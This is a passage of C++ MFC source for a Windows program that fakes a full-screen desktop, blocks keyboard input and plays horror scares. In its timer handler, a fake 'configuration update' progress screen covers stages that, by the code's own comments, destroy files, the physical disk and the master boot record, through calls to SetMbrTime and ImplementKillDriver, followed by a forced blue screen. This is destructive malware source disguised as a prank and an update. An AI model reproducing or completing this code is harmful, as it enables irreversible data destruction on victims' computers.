				GetDlgItem(IDC_Loading)->SetWindowPos(NULL, (rectDlg.Width() - rectLoading.Width())/2,rectLoadPicture.top + rectLoadPicture.Height(), rectLoading.Width(),rectLoading.Height(), SWP_SHOWWINDOW);
				
			}

			//GetDlgItem(IDC_LoadPicture)->InvalidateRect(&rectLoadPicture,false);
			//GetDlgItem(IDC_LoadPicture)->UpdateData(false);
			//UpdateWindow();
		}

		//刷新桌面图标
		if(RefreshDesktopIconSwitch)
		{
			RefreshDesktopIcon();
		}

		//开始菜单重绘
		if(StartMenuDraw)
		{

			RefreshDesktopIconSwitch = false;

			CBitmap *bitmap = new CBitmap; 
			HBITMAP hbmp;  

			if(StartMenuValue)
			{

				//打开图片1
				bitmap->LoadBitmap(IDB_StartMenu2);
				hbmp = (HBITMAP)bitmap->GetSafeHandle();
				m_StartMenu.SetBitmap(hbmp);

			}
			else
			{
				//打开图片2（红色）
				bitmap->LoadBitmap(IDB_StartMenu); 
				hbmp = (HBITMAP)bitmap->GetSafeHandle();
				m_StartMenu.SetBitmap(hbmp);
			}

			bitmap->DeleteObject();
			bitmap->DeleteTempMap();
			delete bitmap;
		}

		//刷新开始菜单
		if(RefreshStart)
		{
			GetDlgItem(IDC_StartBUTTON)->Invalidate(false);
			GetDlgItem(IDC_StartBUTTON)->UpdateWindow();
		}

	}

}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CWinDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}



/*
void CWinDlg::OnButton1() 
{
	// TODO: Add your control notification handler code here
	CWinDlg::OnCancel();
}

void CWinDlg::OnButton2() 
{
	// TODO: Add your control notification handler code here

	sndPlaySound((LPCTSTR)IDR_BackgroundMusic,SND_RESOURCE | SND_ASYNC | SND_LOOP);
}

void CWinDlg::OnButton3() 
{
	// TODO: Add your control notification handler code here
	//GetDlgItem(IDC_Taskbar)->ModifyStyle(0, WS_CLIPSIBLINGS);
	//DesktopElements(false);

	//SetTimer(5,100,NULL);
//DesktopElements(false);

		int cx   =   GetSystemMetrics(SM_CXSCREEN);
		int cy   =   GetSystemMetrics(SM_CYSCREEN);

		CString a;
		a.Format("%d - %d",cx,cy);
		MessageBox(a);

}

*/


//开始按钮
void CWinDlg::OnStartBUTTON() 
{
	// TODO: Add your control notification handler code here



	CBitmap *bitmap = new CBitmap;
	HBITMAP hbmp;

	if(StartMenuValue)
	{

		//打开图片1
		bitmap->LoadBitmap(IDB_StartMenu2);
		hbmp = (HBITMAP)bitmap->GetSafeHandle(); 
		m_StartMenu.SetBitmap(hbmp);

	}
	else
	{
		//打开图片2（红色）
		bitmap->LoadBitmap(IDB_StartMenu);
		hbmp = (HBITMAP)bitmap->GetSafeHandle();
		m_StartMenu.SetBitmap(hbmp);
	}

	Flag =! Flag;
	CRect rectTaskbar,rectStartMenu;
	GetDlgItem(IDC_Taskbar)->GetWindowRect(&rectTaskbar);
	GetDlgItem(IDC_StartMenu)->GetWindowRect(&rectStartMenu);

	m_StartMenu.InvalidateRect(&rectStartMenu,true); 
	m_StartMenu.UpdateWindow();	


	if(Flag)
	{
		GetDlgItem(IDC_StartMenu)->SetWindowPos(NULL, 0, rectTaskbar.top - rectStartMenu.Height(),NULL,NULL,SWP_HIDEWINDOW | SWP_NOSIZE);
		//KillTimer(12);
		StartMenuDraw = false;
	}
	else
	{
		GetDlgItem(IDC_StartMenu)->SetWindowPos(NULL, 0, rectTaskbar.top - rectStartMenu.Height(),NULL,NULL,SWP_SHOWWINDOW | SWP_NOSIZE);
		StartMenuDraw = true;
		OnPaint();
		SetTimer(12,10,NULL); //重绘任务菜单

	}

	m_StartMenu.InvalidateRect(&rectStartMenu,true); 
	m_StartMenu.UpdateWindow();	

	bitmap->DeleteObject();
	bitmap->DeleteTempMap();
	delete bitmap;
}


int DesktopIconFlag1,
	DesktopIconFlag2,
	DesktopIconFlag3,
	DesktopIconFlag4,
	DesktopIconFlag5;

int DesktopIconMap;


//此电脑图标
void CWinDlg::OnDoubleclickedDesktopIcon1() 
{
	// TODO: Add your control notification handler code here

	if(DesktopIconFlag1 != 1)
	{
		DesktopIconMap = 1; //执行标记

		PlaySwitch(false); //关闭屏幕恐怖切换
		DesktopEnabled(false); //不启用桌面元素
		DesktopElements(false); //隐藏桌面元素
		ShowCursor(false); //隐藏鼠标

		sndPlaySound((LPCTSTR)IDR_IDB_BlurredScreen,SND_RESOURCE | SND_ASYNC);
		SetTimer(3,7000,NULL);
		SetTimer(11,5,NULL); //播放花屏

	}
	else
	{
		GetDlgItem(IDC_DesktopIcon1)->EnableWindow(false);
	}

}




//图片图标
short int EyeFlash;
void CWinDlg::OnDoubleclickedDesktopIcon2() 
{
	// TODO: Add your control notification handler code here
	

	if(DesktopIconFlag2 != 3)
	{


		CBitmap bitmap; 
		HBITMAP hbmp;
		DesktopIconMap = 2; //执行标记

		CRect rectDlg,rectContent;

		GetClientRect(&rectDlg);

		PlaySwitch(false); //关闭屏幕恐怖切换
		DesktopEnabled(false); //不启用桌面元素

		bitmap.LoadBitmap(IDB_TaskbarIcon2);
		hbmp = (HBITMAP)bitmap.GetSafeHandle();
		Picture.SetBitmap(hbmp); //设置任务栏图标
		bitmap.DeleteObject();

		//GetDlgItem(IDC_Content)->ShowWindow(SW_SHOW);

		switch(DesktopIconFlag2)
		{
			case 0:

				//打开图片1
				bitmap.LoadBitmap(IDB_Picture1);
				hbmp = (HBITMAP)bitmap.GetSafeHandle();
				m_Content.SetBitmap(hbmp);

				GetDlgItem(IDC_Content)->GetWindowRect(&rectContent);
				GetDlgItem(IDC_Content)->SetWindowPos(NULL, (rectDlg.Width() - rectContent.Width())/2, (rectDlg.Height() - rectContent.Height())/2, rectContent.Width(),rectContent.Height(), SWP_SHOWWINDOW);
				
				UpdateWindow();
				//GetDlgItem(IDC_Content)->UpdateWindow();
				SetTimer(3,3000,NULL);

			break;

			case 1:

				//打开图片2
				bitmap.LoadBitmap(IDB_Picture3); 
				hbmp = (HBITMAP)bitmap.GetSafeHandle();
				m_Content.SetBitmap(hbmp);

				GetDlgItem(IDC_Content)->GetWindowRect(&rectContent);
				GetDlgItem(IDC_Content)->SetWindowPos(NULL, (rectDlg.Width() - rectContent.Width())/2, (rectDlg.Height() - rectContent.Height())/2, rectContent.Width(),rectContent.Height(), SWP_SHOWWINDOW);//点击图标显示的内容
				
				UpdateWindow();
				SetTimer(3,3000,NULL);
			break;
		}

		bitmap.DeleteObject();

	}
	else
	{
		GetDlgItem(IDC_DesktopIcon2)->EnableWindow(false);
	}

}


//文件夹图标
void CWinDlg::OnDoubleclickedDesktopIcon3() 
{
	// TODO: Add your control notification handler code here


	if(DesktopIconFlag3 != 1)
	{


		CBitmap bitmap;
		HBITMAP hbmp;


		DesktopIconMap = 3; //执行标记

		CRect rectDlg,rectContent;

		PlaySwitch(false); //关闭屏幕恐怖切换
		DesktopEnabled(false); //不启用桌面元素


		bitmap.LoadBitmap(IDB_TaskbarIcon3);
		hbmp = (HBITMAP)bitmap.GetSafeHandle();
		Picture.SetBitmap(hbmp);

		bitmap.DeleteObject();

		//打开图片1
		bitmap.LoadBitmap(IDB_Folder1);
		hbmp = (HBITMAP)bitmap.GetSafeHandle();
		m_Content.SetBitmap(hbmp);


		GetClientRect(&rectDlg);
		GetDlgItem(IDC_Content)->GetWindowRect(&rectContent);
		GetDlgItem(IDC_Content)->SetWindowPos(NULL, (rectDlg.Width() - rectContent.Width())/2, (rectDlg.Height() - rectContent.Height())/2, rectContent.Width(),rectContent.Height(), SWP_SHOWWINDOW);//点击图标显示的内容

		UpdateWindow();
		SetTimer(3,3000,NULL); //启用时钟3
	}
	else
	{
		GetDlgItem(IDC_DesktopIcon3)->EnableWindow(false); //文件夹图标按钮无效
	}
}



//文本文档图标
void CWinDlg::OnDoubleclickedDesktopIcon4() 
{
		// TODO: Add your control notification handler code here

	if(DesktopIconFlag4 != 3)
	{

			CBitmap bitmap;
			HBITMAP hbmp;


			DesktopIconMap = 4; //执行标记

			CRect rectDlg,rectContent;

			PlaySwitch(false); //关闭屏幕恐怖切换
			DesktopEnabled(false); //不启用桌面元素


			bitmap.LoadBitmap(IDB_TaskbarIcon4);
			hbmp = (HBITMAP)bitmap.GetSafeHandle();
			Picture.SetBitmap(hbmp);

			bitmap.DeleteObject();


			switch(DesktopIconFlag4)
			{
				case 0:
					//打开图片1
					bitmap.LoadBitmap(IDB_TXT1);
					hbmp = (HBITMAP)bitmap.GetSafeHandle();
					m_Content.SetBitmap(hbmp);

					GetClientRect(&rectDlg);
					GetDlgItem(IDC_Content)->GetWindowRect(&rectContent); 
					GetDlgItem(IDC_Content)->SetWindowPos(NULL, (rectDlg.Width() - rectContent.Width())/2, (rectDlg.Height() - rectContent.Height())/2, rectContent.Width(),rectContent.Height(), SWP_SHOWWINDOW);

					//ContentVisible = true;
					UpdateWindow();
					SetTimer(3,3000,NULL);
					break;

				case 1:

					//打开图片2
					bitmap.LoadBitmap(IDB_TXT2);
					hbmp = (HBITMAP)bitmap.GetSafeHandle();
					m_Content.SetBitmap(hbmp);

					GetClientRect(&rectDlg);
					GetDlgItem(IDC_Content)->GetWindowRect(&rectContent); 
					GetDlgItem(IDC_Content)->SetWindowPos(NULL, (rectDlg.Width() - rectContent.Width())/2, (rectDlg.Height() - rectContent.Height())/2, rectContent.Width(),rectContent.Height(), SWP_SHOWWINDOW);

					//ContentVisible = true;

					UpdateWindow();
					SetTimer(3,3000,NULL);
					break;
			}

	}
	else
	{
		GetDlgItem(IDC_DesktopIcon4)->EnableWindow(false);
	}

	//GetDlgItem(IDC_Content)->ShowWindow(SW_SHOW);
}





//回收站图标
void CWinDlg::OnDoubleclickedDesktopIcon5() 
{
	// TODO: Add your control notification handler code here

	DesktopIconMap = 5;

	if(DesktopIconFlag5 == 0)
	{

		//sndPlaySound((LPCTSTR)IDR_Recycle,SND_RESOURCE | SND_ASYNC);

		//回收站清空
		m_btnX5.LoadBitmaps(IDB_DesktopIcon5_Q);//按钮无效图片
		m_btnX5.Invalidate(); //刷新图片
		m_btnX5.UpdateData();

		//阶段二
		DesktopIconFlag5=1;
	}
	else if(DesktopIconFlag5 == 1)
	{
		PlaySwitch(false); //关闭屏幕恐怖切换
		DesktopEnabled(false); //不启用桌面元素

		//回收站无效
		m_btnX5.LoadBitmaps(IDB_DesktopIcon5_Null);//按钮无效图片
		m_btnX5.Invalidate(); //刷新图片
		m_btnX5.UpdateData();

		SetTimer(4,3000,NULL);

	}
	else
	{
		GetDlgItem(IDC_DesktopIcon5)->EnableWindow(false);
	}




}


//世界再见
void CWinDlg::OnDoubleclickedDesktopIcon6() 
{
	// TODO: Add your control notification handler code here

		PlaySwitch(false); //关闭屏幕恐怖切换
		DesktopEnabled(false); //不启用桌面元素


		CRect rectClose1,rectClose2;
		GetDlgItem(IDC_Close)->GetWindowRect(&rectClose1);
		GetDlgItem(IDC_Close2)->GetWindowRect(&rectClose2); 
		int ButtonWidth = rectClose1.Height() + rectClose2.Height();

		if(m_GifContent.Load(MAKEINTRESOURCE(IDR_GIF1),_T("GIF")))
		{
			m_GifContent.Draw();

			CBitmap bitmap;
			HBITMAP hbmp;
			bitmap.LoadBitmap(IDB_TaskbarIcon6);
			hbmp = (HBITMAP)bitmap.GetSafeHandle();
			Picture.SetBitmap(hbmp);

			CRect rectDlg,rectGifContent;
			GetClientRect(&rectDlg);
			GetDlgItem(IDC_GifContent)->GetWindowRect(&rectGifContent); 
			GetDlgItem(IDC_GifContent)->SetWindowPos(NULL, (rectDlg.Width() - (rectGifContent.Width() + ButtonWidth))/2, (rectDlg.Height() - (rectGifContent.Height() + ButtonWidth))/2, rectGifContent.Width(),rectGifContent.Height(), SWP_SHOWWINDOW);
	
			sndPlaySound((LPCTSTR)IDR_TheEnd,SND_RESOURCE | SND_ASYNC | SND_LOOP);
			ContentVisible=true;


		}


}


//花屏步长
int BStep;

void CWinDlg::OnTimer(UINT nIDEvent) 
{
	// TODO: Add your message handler code here and/or call default

	srand(time(0));

	if(nIDEvent==1)
	{
		//if(!Flag)GetDlgItem(IDC_StartMenu)->ShowWindow(SW_HIDE); Flag=true;//隐藏开始菜单
		if((rand()%20)==19)
		{
			RunTerror();	
		}
		else
		{
			Flag=true;
			GetDlgItem(IDC_StartMenu)->ShowWindow(SW_HIDE); //隐藏任务菜单
			RefreshDesktopIconSwitch = true; //恢复桌面图标刷新

			FlashTerror();
		}

		//Flag = true;
		//GetDlgItem(IDC_StartMenu)->ShowWindow(SW_HIDE);
	}




	//RunTerror()
	else if(nIDEvent==2)
	{
			CRect rectDlg;
			GetClientRect(&rectDlg);

			srand(time(0));

			//还原
			switch(rand()%4)
			{
			case 0:
				PictureNumber=IDB_Desktop1;
				break;
			case 1:
				PictureNumber=IDB_Desktop2;
				break;
			case 2:
				PictureNumber=IDB_Desktop3;
				break;
			case 3:
				PictureNumber=IDB_Desktop4;
				break;
			}
			DesktopElements(true);
			StartMenuValue = true; //使用菜单样式2
			ShowCursor(true); //显示鼠标

			//刷新
			InvalidateRect(&rectDlg,false);
			UpdateWindow();
			sndPlaySound(NULL,NULL);

			SetTimer(1,RefreshTime,NULL);
			SetTimer(6,1000,NULL); //播放背景音乐
			KillTimer(2);

	}
	//CDialog::OnPaint();



	//处理用户单击图标
	else if(nIDEvent==3)
	{

			//处理此电脑图标
			if(DesktopIconMap==1)
			{

				CBitmap bitmap; 
				HBITMAP hbmp;

				bitmap.LoadBitmap(IDB_TaskbarIcon1);
				hbmp = (HBITMAP)bitmap.GetSafeHandle();
				Picture.SetBitmap(hbmp);


				m_btnX1.LoadBitmaps(IDB_DesktopIcon1_Null);//按钮无效图片
				m_btnX1.Invalidate();
				m_btnX1.UpdateData();

				//sndPlaySound((LPCTSTR)IDR_Appear2,SND_RESOURCE | SND_ASYNC);

				DesktopIconFlag1 = 1;

				//隐藏任务栏图标
				GetDlgItem(IDC_TaskbarIcon)->ShowWindow(false);
		
				sndPlaySound(NULL,NULL);

				SetTimer(2,10,NULL); //归位

				PlaySwitch(true); //开启屏幕恐怖切换
				DesktopEnabled(true); //启用桌面元素

				KillTimer(11); //关闭花屏

				SetTimer(6,4000,NULL);

			}
			
			//处理图片图标
			else if(DesktopIconMap==2)
			{

				switch(DesktopIconFlag2)
				{

				//图片图标第一阶段被激活
				case 0:

					//图片红色闪烁
					SetTimer(8,50,NULL);

				break;

				//图片图标第二阶段被激活
				case 1:
					//因为不存在3这个MAP所以3表示结束
					DesktopIconFlag2=3; 
					//隐藏图片框
					GetDlgItem(IDC_Content)->ShowWindow(SW_HIDE);


					//启动计时器7秒后播放恐怖画面
					SetTimer(4,7000,NULL);

					//隐藏桌面
					DesktopElements(false);

					//播放声音
					sndPlaySound((LPCTSTR)IDR_Appear,SND_RESOURCE | SND_ASYNC);

					//切换图片并刷新
					PictureNumber=IDB_Eyes;
					Invalidate(false);
					UpdateWindow();

					//图片图标无效
					m_btnX2.LoadBitmaps(IDB_DesktopIcon2_Null);//按钮无效图片
					m_btnX2.Invalidate(); //刷新图片
					m_btnX2.UpdateData();
				break;

			}


		}

		//处理文件夹图标
		else if(DesktopIconMap==3)
		{

			CBitmap bitmap;
			HBITMAP hbmp;

			CRect rectDlg,rectContent;

			//打开图片2
			bitmap.LoadBitmap(IDB_Folder2);
			hbmp = (HBITMAP)bitmap.GetSafeHandle();
			m_Content.SetBitmap(hbmp);

			GetClientRect(&rectDlg);
			GetDlgItem(IDC_Content)->GetWindowRect(&rectContent);

			//sndPlaySound((LPCTSTR)IDR_Appear,SND_RESOURCE | SND_ASYNC);
			sndPlaySound((LPCTSTR)IDR_Appear2,SND_RESOURCE | SND_ASYNC);

			GetDlgItem(IDC_Content)->SetWindowPos(NULL, (rectDlg.Width() - rectContent.Width())/2, (rectDlg.Height() - rectContent.Height())/2, rectContent.Width(),rectContent.Height(), SWP_SHOWWINDOW);
			UpdateWindow();

			SetTimer(9,3500,NULL); //归位
		}

		//处理文本文档图标
		else if(DesktopIconMap==4)
		{

			switch(DesktopIconFlag4)
			{
				//阶段一
				case 0:
					PlaySwitch(true); //开启屏幕恐怖切换
					DesktopEnabled(true); //启用桌面元素

					//跳转到阶段二
					DesktopIconFlag4 = 1;

					//隐藏图片框
					GetDlgItem(IDC_Content)->ShowWindow(SW_HIDE);

					//隐藏任务栏图标
					GetDlgItem(IDC_TaskbarIcon)->ShowWindow(false);

				break;
				//阶段二
				case 1:
					//因为不存在3这个MAP所以3表示结束
					SetTimer(4,3000,NULL);
				break;
			}

		}



		KillTimer(3);


	}


	else if(nIDEvent==4)
	{

		//文本文档事件
		if(DesktopIconMap==4)
		{
			if(DesktopIconFlag4==1)
			{
				//隐藏图片框
				GetDlgItem(IDC_Content)->ShowWindow(SW_HIDE);
				//图片图标无效
				m_btnX4.LoadBitmaps(IDB_DesktopIcon4_Null);//按钮无效图片
				m_btnX4.Invalidate();
				m_btnX4.UpdateData();

				DesktopIconFlag4 = 3; 

			}
		}

		//回收站事件
		if(DesktopIconMap==5)
		{
			if(DesktopIconFlag5==1)
			{
				PlaySwitch(false); //关闭屏幕恐怖切换
				DesktopEnabled(false); //不启用桌面元素

				DesktopIconFlag5=3;
			}

		}

		srand(time(0));
		RunTerror();
		DesktopEnabled(true); //启用桌面元素
		KillTimer(4);
	}


	//加载ing
	else if(nIDEvent==5)
	{

		CRect rectDlg,rectLoadPicture;
		GetClientRect(&rectDlg);

		GetDlgItem(IDC_LoadPicture)->GetWindowRect(&rectLoadPicture);
		CTime m_time;
		switch(LoadingFlag)
		{
			case 0: //该阶段进行破坏文件
				KillTimer(5);

				StartLoading = true; //开始加载标记

				//加载“配置更新 1%”文字
				LoadingTXT = IDB_LoadTXT2;
				//刷新
				InvalidateRect(&rectLoadPicture,false);
				UpdateData(false);
				//进入下一项的标记
				LoadingFlag =1;
				//SetTimer(5,15000,NULL); //15000
			break;

			case 1: //该阶段进行破坏磁盘和主引导扇区
				KillTimer(5);

				//加载“配置更新 99%”文字
				LoadingTXT = IDB_LoadTXT3;
				//刷新
				InvalidateRect(&rectLoadPicture,false);
				UpdateData(false);
				//进入下一项的标记
				LoadingFlag =2;


				//破坏磁盘和主引导扇区
				m_time=CTime::GetCurrentTime(); //获取当前时间日期  
				SetMbrTime(m_time.Format(_T("%Y/%m/%d"))); //写入当前时间日期  
				//UpdateData(false); 

				//判断破坏物理驱动器和写入mbr主引导扇区是否成功
				if(ImplementKillDriver())
				{
					SetTimer(5,4000,NULL);
				}
				else
				{
					BlueError(); //触发蓝屏
				}

			break;

			case 2:
				//加载“撤销更改”文字
				LoadingTXT = IDB_LoadTXT4;
				//刷新
				InvalidateRect(&rectLoadPicture,false);
				UpdateData(false);
				//进入下一项的标记
				LoadingFlag =3;
				SetTimer(5,10000,NULL); //12000
			break;

			case 3:
				m_Loading.UnLoad();
				//取消绘制加载元素
				LoadingVisible=false;
				//隐藏加载元素
				GetDlgItem(IDC_LoadPicture)->ShowWindow(SW_HIDE);
				GetDlgItem(IDC_Loading)->ShowWindow(SW_HIDE);

				sndPlaySound((LPCTSTR)IDR_Appear,SND_RESOURCE | SND_ASYNC);
				//sndPlaySound((LPCTSTR)IDR_Appear2,SND_RESOURCE | SND_ASYNC);

				//切换背景
				PictureNumber=IDB_LoadBackground1; //蓝色背景
				//刷新背景
				InvalidateRect(&rectDlg,false);
				UpdateData(false);
				//进入下一项的标记
				LoadingFlag =4;
				SetTimer(5,5000,NULL); //5000
			break;

			case 4:
				sndPlaySound((LPCTSTR)IDR_WinLoad,SND_RESOURCE | SND_ASYNC);

				//黑色背景
				PictureNumber=IDB_Black; 
				//更改对其方式gif
				Alignment=1;
				//加载gif
				if(m_Loading.Load(MAKEINTRESOURCE(IDR_GIF3),_T("GIF")))
				{
					m_Loading.Draw(); //播放gif
				}
				LoadingVisible = true; //绘制加载元素
				LoadingTXT = IDB_Windows; //加载的文字
				//刷新居中的图片
				InvalidateRect(&rectLoadPicture,false);
				UpdateData(false);
				//刷新背景
				InvalidateRect(&rectDlg,false);
				UpdateData(false);

				//进入下一项的标记
				LoadingFlag =5;
				SetTimer(5,5000,NULL); //5000
			break;

			case 5:
				//黑色背景
				PictureNumber=IDB_Black; 
				//更改对其方式gif
				Alignment=2;
				m_Loading.UnLoad();
				if(m_Loading.Load(MAKEINTRESOURCE(IDR_GIF4),_T("GIF")))
				{
					m_Loading.Draw(); //播放gif
				}
				LoadingVisible = true; //绘制加载元素
				LoadingTXT = IDB_User; //加载的文字
				//刷新居中的图片
				InvalidateRect(&rectLoadPicture,false);
				UpdateData(false);
				//刷新背景
				InvalidateRect(&rectDlg,false);
				UpdateData(false);

				//进入下一项的标记
				LoadingFlag =6;
				SetTimer(5,5000,NULL); //5000
			break;

			case 6:
				m_Loading.UnLoad();
				//取消绘制加载元素
				LoadingVisible=false;
				//隐藏加载元素
				GetDlgItem(IDC_LoadPicture)->ShowWindow(SW_HIDE);
				GetDlgItem(IDC_Loading)->ShowWindow(SW_HIDE); 
				//切换默认背景
				PictureNumber=IDB_Desktop;
				//显示桌面元素
				DesktopElements(true);
				InvalidateRect(&rectDlg,false);
				UpdateData(false);
				SetTimer(6,1000,NULL); 
				//桌面开始出现恐怖画面
				SetTimer(1,RefreshTime,NULL);
				
				ShowCursor(true);//显示鼠标图标
				RefreshDesktopIconSwitch = true; //恢复桌面图标刷新
				RefreshStart = true; //刷新开始菜单

				KillTimer(5);
			break;

		}

	}
	//播放音乐
	else if(nIDEvent==6)
	{
		sndPlaySound((LPCTSTR)IDR_BackgroundMusic,SND_RESOURCE | SND_ASYNC | SND_LOOP); 
		KillTimer(6);
	}

	//处理FlashTerror()善后工作
	else if(nIDEvent==7)
	{

		CRect rectDlg,rectTaskbar;
		GetClientRect(&rectDlg);
		GetDlgItem(IDC_Taskbar)->GetWindowRect(&rectTaskbar); //任务栏

		switch(rand()%4)
		{
		case 0:
			PictureNumber=IDB_Desktop1;
			break;
		case 1:
			PictureNumber=IDB_Desktop2;
			break;
		case 2:
			PictureNumber=IDB_Desktop3;
			break;
		case 3:
			PictureNumber=IDB_Desktop4;
			break;
		}
		InvalidateRect(&rectDlg,false);
		UpdateData();

		KillTimer(7);
	}


	//处理图片图标闪烁计时器
	else if(nIDEvent==8)
	{

		CBitmap bitmap; 
		HBITMAP hbmp;
		switch(EyeFlash)
		{
			case 0:	
				//打开图片2（红色）
				bitmap.LoadBitmap(IDB_Picture2);
				hbmp = (HBITMAP)bitmap.GetSafeHandle();
				m_Content.SetBitmap(hbmp);
				bitmap.DeleteObject();
				EyeFlash=1;
				SetTimer(8,60,NULL); 
			break;

			case 1:
				//打开图片1
				bitmap.LoadBitmap(IDB_Picture1);
				hbmp = (HBITMAP)bitmap.GetSafeHandle();
				m_Content.SetBitmap(hbmp);
				bitmap.DeleteObject();
				EyeFlash=2;
				SetTimer(8,60,NULL); 
			break;


			case 2:
				//打开图片2（红色）
				bitmap.LoadBitmap(IDB_Picture2);
				hbmp = (HBITMAP)bitmap.GetSafeHandle();
				m_Content.SetBitmap(hbmp);
				EyeFlash=3;
				bitmap.DeleteObject();
				SetTimer(8,2000,NULL); 
			break;

			case 3:
				//隐藏图片框
				GetDlgItem(IDC_Content)->ShowWindow(SW_HIDE);

				//切换到阶段二
				DesktopIconFlag2=1;

				//启动计时器3秒后播放恐怖画面
				SetTimer(4,3000,NULL);

				//隐藏任务栏图标
				GetDlgItem(IDC_TaskbarIcon)->ShowWindow(false);
				KillTimer(8);
			break;

		}

	}

	//处理文件夹图标计时器
	else if(nIDEvent==9)
	{
		//隐藏图片框
		GetDlgItem(IDC_Content)->ShowWindow(SW_HIDE);
		//图片图标无效
		m_btnX3.LoadBitmaps(IDB_DesktopIcon3_Null);//按钮无效图片
		m_btnX3.Invalidate(); //刷新图片
		m_btnX3.UpdateData();

		sndPlaySound((LPCTSTR)IDR_BackgroundMusic,SND_RESOURCE | SND_ASYNC | SND_LOOP);

		PlaySwitch(true); //开启屏幕恐怖切换
		DesktopEnabled(true); //启用桌面元素

		//隐藏任务栏图标
		GetDlgItem(IDC_TaskbarIcon)->ShowWindow(false);

		DesktopIconFlag3 = 1;

		//SetTimer(6,500,NULL);

		KillTimer(9);
	}

	//对话框置顶刷新操作
	else if(nIDEvent==10)
	{
		cx   =   GetSystemMetrics(SM_CXSCREEN);
		cy   =   GetSystemMetrics(SM_CYSCREEN);

		if(cx >= 1024 || cy >= 768)
		{
			::SetWindowPos(GetSafeHwnd(),HWND_TOPMOST,0,0,cx,cy,SWP_ASYNCWINDOWPOS | SWP_DEFERERASE | SWP_NOREDRAW);
		}
		else
		{
			::SetWindowPos(GetSafeHwnd(),HWND_TOPMOST,0,0,1024,768,SWP_ASYNCWINDOWPOS | SWP_DEFERERASE | SWP_NOREDRAW);
		}

		if(cx != cx || cy != cy)
		{
			CRect rectDlg;
			GetWindowRect(&rectDlg);
			ScreenToClient(&rectDlg);

			InvalidateRect(&rectDlg,false);
			UpdateWindow();

		}

	}

	//花屏
	else if(nIDEvent==11)
	{

		PictureNumber = IDB_BlurredScreen1 + BStep;
		if(BStep < 5) BStep++;
		else BStep = 0;

		CRect rectDlg;
		GetClientRect(&rectDlg);
		GetWindowRect(&rectDlg);

		InvalidateRect(&rectDlg,false);
		UpdateWindow();
	}


	//任务菜单栏
	else if(nIDEvent==12)
	{

		if(m_StartMenu.IsWindowVisible())
		{

			if(GetKeyState(VK_LBUTTON) && 0x8000)
			{
				CPoint point;
				CRect rect;
				GetDlgItem(IDC_StartBUTTON)->GetWindowRect(&rect);  //screen坐标系
				ScreenToClient(&rect); 
				GetCursorPos(&point);
				ScreenToClient(&rect); 
				if(!(point.x > rect.left && point.x < rect.right && point.y < rect.bottom && point.y > rect.top))
				{ 
					if(Flag == false)
					{
						KillTimer(12);
						StartMenuDraw = false;
						Flag=true;
						GetDlgItem(IDC_StartMenu)->ShowWindow(SW_HIDE);
						RefreshDesktopIconSwitch = true;
					}
				} 

			}
/*
			else
			{
				CBitmap *bitmap = new CBitmap;
				HBITMAP hbmp;

				if(StartMenuValue)
				{
					bitmap->LoadBitmap(IDB_StartMenu2);
					hbmp = (HBITMAP)bitmap->GetSafeHandle();
					m_StartMenu.SetBitmap(hbmp);

				}
				else
				{
					//打开图片2（红色）
					bitmap->LoadBitmap(IDB_StartMenu);
					hbmp = (HBITMAP)bitmap->GetSafeHandle();
					m_StartMenu.SetBitmap(hbmp);
				}

				bitmap->DeleteObject();
				bitmap->DeleteTempMap();
				delete bitmap;
			}
*/

		}
		else
		{
			KillTimer(12);
			StartMenuDraw = false;
		}
	}

	//判断线程是否结束
	else if(nIDEvent==13)
	{
		if(threadEnd)
		{
			if(StartLoading)
			{
				KillTimer(13);
				SetTimer(5,1000,NULL);
			}
		}
	}

CDialog::OnTimer(nIDEvent);
}




void CWinDlg::OnClose() 
{
	// TODO: Add your control notification handler code here

	GetDlgItem(IDC_Close)->EnableWindow(false);
	sndPlaySound((LPCTSTR)IDR_Appear,SND_RESOURCE | SND_ASYNC);
	DrawScreen();
	BlueError();
}

void CWinDlg::OnClose2() 
{
	// TODO: Add your control notification handler code here

	GetDlgItem(IDC_Close2)->EnableWindow(false);

	//sndPlaySound((LPCTSTR)IDR_Appear,SND_RESOURCE | SND_ASYNC);

	if(m_GifContent.Load(MAKEINTRESOURCE(IDR_GIF5),_T("GIF")))
	{
		m_GifContent.Draw();

		//更换按钮1图片
		m_btnX7.LoadBitmaps(IDB_Button01);//按钮无效图片
		m_btnX7.Invalidate();
		m_btnX7.UpdateData();

		//图片图标无效
		m_btnX8.LoadBitmaps(IDB_Button2_NO);//按钮无效图片
		m_btnX8.Invalidate();
		m_btnX8.UpdateData();
	}

}

BOOL CWinDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	
    if (WM_KEYDOWN == pMsg->message )
    {
        switch (pMsg->wParam)
        {
        case VK_ESCAPE:
            return TRUE;
		break;

        case VK_RETURN:
            return TRUE;
		break;

        case VK_F1:
            return TRUE;
		break;

        default:
            return TRUE;
        }

    }

	return CDialog::PreTranslateMessage(pMsg);
}
